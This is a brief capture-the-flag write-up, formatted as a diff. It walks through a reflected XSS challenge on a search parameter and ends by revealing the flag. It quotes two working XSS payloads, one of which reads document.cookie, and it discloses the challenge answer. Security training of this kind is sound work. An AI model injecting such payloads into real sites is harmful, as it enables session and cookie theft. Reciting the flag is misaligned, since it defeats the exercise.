@@ -1,0 +1,11 @@
+open home page the hind is call cookie
+
+search parameter 
+
+enter some xss payload <img src=x onerror=alert(1)>
+
+xss trigger but where the flag
+
+enter the payload with cookie <img src=x onerror=alert(document.cookie)>
+
+flag is shown : WBCOECTF{XsS_kIng_mAde}
